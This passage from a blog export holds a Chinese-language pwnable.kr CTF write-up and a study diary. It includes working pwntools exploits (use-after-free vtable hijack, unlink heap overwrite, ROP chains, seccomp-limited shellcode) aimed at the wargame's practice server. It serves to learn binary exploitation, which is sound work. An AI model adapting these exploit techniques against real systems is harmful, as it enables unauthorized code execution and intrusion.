xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 额，这题比较坑，要不是有hint也不知道能不能做出来。。。。。有hint就很简单了。。。。不说了吧 shellshock思路：1. 有源码： 1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; 根据提示和源码较为简单，猜是一道知识题 shellshock知识参考 需要注意的一点是执行cat flag时要改成 /bin/cat flag 因为sh的环境变量中未必有/bin，所以cat命令不一定能找到，最好用绝对路径。 coin1(借鉴别人的，不想写了。。)exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152# coding: utf-8import socketimport randomimport timeimport reimport string def getweight(start, end): str_ask = [str(n) for n in range(start, end)] str_ask = " ".join(str_ask) client.send(bytes(str_ask+"\n")) str_weight = client.recv(10) str(str_weight).split("\n") weight = int(str_weight) return weight HOST = ('0.0.0.0')PORT = 9007client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client.connect((HOST, PORT))data = client.recv(1024)time.sleep(4)for i in range(100): recv_data = str(client.recv(2048)) position_of_number = (recv_data.find('N=')) position_of_chance = (recv_data.find('C=')) # print(position_of_number) # print(position_of_chance) number = 0 chance = 0 for k in range(10): if str(recv_data[position_of_number + 2 + k]) &lt;= '9' and str(recv_data[position_of_number + 2 + k]) &gt;= '0': number = int(recv_data[position_of_number + 2 + k]) + number * 10 k += 1 else: break for k in range(100): if str(recv_data[position_of_chance + 2 + k]) &lt;= '9' and str(recv_data[position_of_chance + 2 + k]) &gt;= '0': chance = int(recv_data[position_of_chance + 2 + k]) + chance * 10 k += 1 else: break start = 0 end = number middle = int((start+end) / 2) for p in range(chance): weight=getweight(start, middle) if (middle - start) * 10 == weight: start = middle # print("start:",start) middle = int((middle + end) / 2) # print("middle:",middle) else: end = middle #print("start:", start) middle = int((start + middle) / 2) #print("middle:", middle) if (middle == start): print(end) client.send(bytes(str(start) + "\n"))s = client.recv(1024)print(s)#就是在这里昨天多加了一个enter，从而导致后面接收的数据有误(得加红加粗纪念一下）#client.send(bytes("\n", encoding="utf-8"))（垃圾代码毁我青春）s2=client.recv(1024)print(s2) blackjack思路：额，这题不想说啥，800多行代码其实就一小部分有用，就是考耐心与阅读速度，根据提示下赌注，成为百万富翁，然后就有flag了。 lotto思路：这题和上题一样也是脑洞一点的题，需要一点知识储备，就是ascii码表33号以后才为可见字符，范围大大缩小，等于在33~45的字符里随便选一个有 6/(45-33) 的概率获得flag。试几次就有了。。 cmd1思路：使参数通过滤器，利用字符串补齐功能即可。 cmd2思路：分析源代码可知是加强的过滤，需要你去了解环境变量PATH的作用和意义，extern 从外界导入变量，并且用一个函数将环境变量清空，代表所有的命令都必须是绝对路径。不能用‘/’是最操蛋的事，所以必须在根目录里用$(pwd)来显示‘ /‘，$(命令)的意义是将命令在sh里输入时的输出结果原封不动的换在$()的位置。 uaf思路： 1. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt; #include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system("/bin/sh"); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man("Jack", 25); Human* w = new Woman("Jill", 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; "1. use\n2. after\n3. free\n"; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; "your data is allocated" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0; &#125; 从这题开始就有点难度了，开始向读者介绍一些基本的pwn的方法，并且需要学很多新的知识，有知识才能解题，经过一番查阅后得知uaf为use after free/delete，即先malloc()一段空间后，free/delete后指向其的指针却没有NULL，从而继续申请一块大小相似的malloc()后（数据精心设计），这个指针将指向他，可以通过操纵这个指针来操纵这块被设计的数据空间，进而pwn。 大致思路分三步：一是先找到原来MAN申请的内存大小，作为第二个参数，二是找到虚函数表的地址，在ida里就可以解决，三是创建一个文件将修改的数据放进去(我创建文件创建不了，不知道为啥，只能从标准输入输入了)。 exp：（看别人的exp学到一个新技能，/dev/stdin） 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='uaf',port=2222,password='guest')p=s.process(executable='./uaf',argv=['./uaf','24','/dev/stdin'])p.recv(1024)p.sendline('3')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('1')p.interactive() memcpy思路： 1. 有源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm("rdtsc");&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Hey, I have a boring assignment for CS class.. :(\n"); printf("The assignment is simple.\n"); printf("-----------------------------------------------------\n"); printf("- What is the best implementation of memcpy? -\n"); printf("- 1. implement your own slow/fast version of memcpy -\n"); printf("- 2. compare them with various size of data -\n"); printf("- 3. conclude your experiment and submit report -\n"); printf("-----------------------------------------------------\n"); printf("This time, just help me out with my experiment and get flag\n"); printf("No fancy hacking, I promise :D\n"); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf("specify the memcpy amount between %d ~ %d : ", low, high); scanf("%d", &amp;size); if( size &lt; low || size &gt; high )&#123; printf("don't mess with the experiment.\n"); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf("ok, lets run the experiment with your configuration\n"); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf("experiment %d : memcpy with buffer size %d\n", i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1); printf("\n"); &#125; printf("thanks for helping my experiment!\n"); printf("flag : ----- erased in this source code -----\n"); return 0;&#125; 很明显要先学习知识：需要学习setvbuf()，mmap()函数，和c语言内嵌汇编的形式，以及movdqa,movntps命令是干啥的，也就是必须要理解以下这段代码是什么意思，在此分享一篇相当详细的文章 链接 1234567891011while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); 其实这题实际上想考的是堆分配时字节对齐问题。只要保证每次输入的数在他要求的范围内并且顺利运行完程序即可，问题在于movntps和movdqa要求操作的内存地址必须为16字节对齐的，所以dest必须为0x——0，可以在代码中加上一句 printf (“dest: %d\n”, dest) 再运行就观察起来方便很多，每次dest比上次增加的数就是上一次的size+8，自己找规律即可。 asm思路： 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox()&#123; scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) &#123; printf("seccomp error\n"); exit(0); &#125; seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0)&#123; seccomp_release(ctx); printf("seccomp error\n"); exit(0); &#125; seccomp_release(ctx);&#125;char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";unsigned char filter[256];int main(int argc, char* argv[])&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Welcome to shellcoding practice challenge.\n"); printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"); printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"); printf("If this does not challenge you. you should play 'asg' challenge :)\n"); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf("give me your x64 shellcode: "); read(0, sh+offset, 1000); alarm(10); chroot("/home/asm_pwn"); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;&#125; 正如开头所说，第一部分为了帮我们搭一个框架，所以各方面都稍微涉及到，这题的目的是让我们对shellcode有一定的了解，分析代码，发现需要学的东西有沙箱中的seccomp() 参考1 参考2 然后他限制我们只能用open read write exit等 所以基本思路就是用read读flag中的内容，然后用write向标准输出写。然后写exp时需要用shellcraft生成调用函数的汇编代码再用反汇编生成shellcode。学会了一些写exp的新知识。 exp： 1234567891011from pwn import * s=ssh(host='pwnable.kr',user='asm',password='guest',port=2222)p=s.connect_remote('0',9026)context(arch='amd64',os='linux') shellcode=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_ file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooo oooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooo oooooo000000000000o0o0o0o0o0o0ong')shellcode+=shellcraft.open('rsp',0)shellcode+=shellcraft.read('rax','rsp',1000)shellcode+=shellcraft.write(1,'rsp',1000) p.sendline(asm(shellcode))p.interactive() unlink思路: 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123; struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];&#125;OBJ;void shell()&#123; system("/bin/sh");&#125;void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123; malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf("here is stack address leak: %p\n", &amp;A); printf("here is heap address leak: %p\n", A); printf("now that you have leaks, get shell!\n"); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;&#125; 这一题算是最基础的模仿unlink的堆的题目，设计的很巧妙，简洁易懂这和初学者入手，先查阅资料得知unlink的基本原理(我看的范例是double free)，理解unlink()函数的意图是解题关键，即B-&gt;fd-&gt;bk=B-&gt;bk B-&gt;bk-&gt;fd=B-&gt;fd 等价为 (**B+4)= （B+4） （B+4）= B 改写B中fd和bk的值理论上可以向任何地址写入任何数据。 开始解题： exp： 注意：recv()接收数据以字符串的形式，例：‘0x456789’占8个字节。print一下即可知道接收了几个字节。 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)p=s.process('./unlink')sh_addr=0x080484ebp.recvuntil('here is stack address leak: ')stack_addr=p.recv(10)stack_addr=int(stack_addr,16)p.recvuntil('here is heap address leak: ')heap_addr=p.recv(10)heap_addr=int(heap_addr,16)payload=p32(sh_addr) + 'A' * 12 + p32(heap_addr+12) +p32(stack_addr+16)p.send(payload)p.interactive() blukathorcruxes思路：1. 没有源码，只能远程下载（scp -P 2222 horcruxes@pwnable.kr:~/horcruxes Desktop）在放进ida里分析。 题目提示为rop则肯定是利用栈溢出来pwn，所以找gets()成为第一步，发现在ropme()函数里有gets()，所以思路基本确定为改写ropme()的ret，分别打印出ABCDEFG的值，然后算出sum，之后再跳到ropme()函数再执行一次拿到flag。(难点在于写exp…….) 大致步骤为：1.先用ida找到七个函数的地址，记录下来之后 2.看偏移确定payload (操蛋的是sum的范围不能超过int，必须用一个if else结构选择一下) exp1： 12345678910111213141516171819202122232425262728293031from pwn import * s=ssh(host='pwnable.kr',user='horcruxes',password='guest',port=2222)p=s.connect_remote('localhost',9032)horcruxes=[0x0809fe4b,0x0809fe6a,0x0809fe89,0x0809fea8,0x0809fec7,0x0809fee6,0x0809ff05] ropme_addr=0x0809fff9sum=0p.sendlineafter("Select Menu:",'0')p.recvuntil("How many EXP did you earned? : ")payload='a'*0x78for i in range(7): payload+=p32(horcruxes[i])payload+=p32(ropme_addr)p.sendline(payload) for i in range(7): p.recvuntil("EXP +") tmp=p.recvuntil(")",drop=True) log.info(tmp) sum+=int(tmp,10)log.info("raw sum: 0x%x" % sum)if sum&gt;pow(2,31): log.warn('try again') exit(0)elif sum&lt;-pow(2,31): log.warn('try again') exit(0)p.sendlineafter("Select Menu:",'0')p.sendlineafter("How many EXP did you earned? : ",unicode(sum))p.interactive() exp2: 1234567891011121314151617181920212223242526272829303132333435from pwn import *from ctypes import *s=ssh(port=2222,host='pwnable.kr',user='horcruxes',password='guest')HOST = "localhost"PORT = 9032r = s.remote(HOST, PORT)horcruxes = [0x0809FE4B, 0x0809FE6A, 0x0809FE89, 0x0809FEA8, 0x0809FEC7, 0x0809FEE6, 0x0809FF05]main_call_ropme = 0x0809fffc def main () : exp = 0 r.recvuntil("Menu:") r.sendline('1') r.recvuntil(" : ") payload = "A"*116 payload += "B"*4 # SFP for i in range (7) : payload += p32(horcruxes[i]) payload += p32(main_call_ropme) r.sendline(payload) for i in range (7) : r.recvuntil("+") tmp = r.recvuntil(")").replace(")","") log.info(tmp) exp += int(tmp) log.info("exp : " + str(c_int(exp).value)) r.recvuntil("Menu:") r.sendline("1") r.recvuntil(" : ") r.sendline(str(c_int(exp).value)) r.interactive() if __name__ == '__main__' : main() pwnable.kr第一部分到此结束，（以前有一题codemap好像挺不错的，有空可以找来看一下。）也算对这一个多月时间的交代吧，进度已经慢太多，也有不少细节问题没弄懂。。。下一部分计划是跟着ctf-wiki把栈溢出学完，然后去jarvis.oj把栈溢出的七道题做了，然后在跟着ctf-wiki体系学习。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小心得1]]></title>
    <url>%2F2018%2F12%2F20%2Fweek1%2F</url>
    <content type="text"><![CDATA[解决的题目：kr.unlink 收获与问题： unlink收货： 对chunk结构有了初步了解 （具体） 对指针有了更加具体的概念，-&gt;代表的意义更加清晰，我个人比较喜欢用一层一层来理解指针，地址一层一层指向。以B-&gt;fd-&gt;bk=B-&gt;bk B-&gt;bk-&gt;fd=B-&gt;fd 也就是 (**B+4)= （B+4） （B+4）= B 工具更熟练，gdb了解了info frame()，bt(查看函数栈框信息)，b *addr（在汇编码地址下断点） ，list funcname(查看函数代码)，file docuname(查看文件信息（主要看elf文件有没有加壳和32还是64位)（说到这我elf文件还没开始看QAQ ),s(进入函数),n(不进入函数) gdb调试 一个比较弱智的东西：怎么用gcc把代码在64位系统上编译为32位elf文件。(这是做所有题目的基础，我竟然现在才发觉OTZ) 例：gcc -m32 -o -g unlink unlink.c (需要先安32位的库，网上都有) call(先将地址压栈，后eip进入子函数),leave(mov esp,ebp pop ebp),ret(pop eip) 抄了一遍exp，大致有个印象(暂时没有花时间学，下周任务) asm收货： 读flag方法：有shell以后，cat flag或者从flag读到缓冲区在write到标准输出。（一般在有沙箱时使用） print disasm(“机器码”)。 shellcraft.sh(),shellcraft.pushstr(),shellcraft.write(),shellcraft.read()出来的都是汇编代码，需要再asm一下。 rop收货 栈溢出基本思路：找带有输入漏洞函数（scnaf,gets）的函数(不要觉得main函数特殊),然后再利用偏移控制程序执行流。一找输入漏洞，二确定利用哪一个函数ret，三rop 稍稍复杂的exp怎么写 其他收货： 写blog时git config –global user.name/user.email时总是报错说找不到.gitconfig文件，但是实际上文件就在那里，上网找了好久，好像是.gitconfig目录少了一个.git文件夹 然后我用管理员身份运行它就可以hexo d了 我也不清楚为啥 反正现在主题也选好了，起码可以开始正常写blog了。：）此外，对blog的config文件也更加熟悉。 用ida可以直接看到栈中缓冲区和变量的地址（F5大法），peda的功能更加熟悉(可以直接查看寄存器的值，栈的值，将要执行的指令等)，收货一个pattern.py脚本，可用来算溢出点，但自己看最好。 0xfffffff8(%ebp)=%ebp-0x8 exp基本框架以及pwntools基本用法： pwntools使用简介 pwntools开始使用 一步一步学pwntools 123456789101112131415161718192021from pwn import *//s=ssh(host=&apos;&apos;,user=&apos;&apos;,password=&apos;&apos;,port=)p=s.connect_remote(&apos;服务器名称&apos;,port)/p=s.process(argv=[],executable=&apos;./文件名&apos;)context(arch=&apos;amd64&apos;,os=&apos;linux&apos;,log_level=&apos;debug&apos;)//log_level=&apos;debug&apos;的作用是将recv的内容全都显示在屏幕上。//定义变量p.recv(接收字节数)p.recvuntil(&apos;源代码中字符串&apos;)p.recvline()p.recvall()p.recvrepeat()p.send(发送字节数)p.senduntil(&apos;源代码中字符串&apos;)p.sendline()//shellcode生成：//payload生成:payload=&apos;n&apos;*mpayload+=p32(整数)/p64(整数)p.sendline(payload)p.interactive() send()和sendline()的区别:(已解决。。因为源代码有一个gets()函数,末尾必须加一个换行符已以告知程序输入完毕，所以写exp时用sendline(payload),或者用send(payload + ‘\n’)).. （还没细看）关于一些保护措施(ASRL/PIE, NX/DEP, RELRO, Canary(栈保护))，参考链接 linux程序的常用保护机制 先看寻址方式，再看gdb中偏移量 当看到很多大写字母变量换成数字时，常为宏定义 scanf()函数限制了输入的形式，不能随意控制，其应该是整数溢出的漏洞题型。现阶段能掌握的只有gets()函数。。。。。。（p32打包好像只能用于字符串中的整数，scanf(%d)中的必须自己输入send(‘整数’)，不加’‘代表为字节数。。） recv()的接收数据为字符串，且一位为一个字符。 p.recv(“)”,drop=True) == p.recv(“)”).replace(“)”,””) log为显示在屏幕上 有info warn 等几种标号 log 我觉得可能是网站的问题，前段时间做uaf的时候就觉得很怪，他题目的答案和在我电脑上跑出来的不一样，uaf的vtable地址都不一样，unlink的ABC地址都不一样。 工具还是用的不熟，以及汇编代码看的还是没感觉。还是练得太少 怎么创建一个新文件，以前还会，现在怎么不会了，服了，查了一会没查到，]]></content>
      <tags>
        <tag>pwn基础</tag>
        <tag>小心得</tag>
      </tags>
  </entry>
</search>
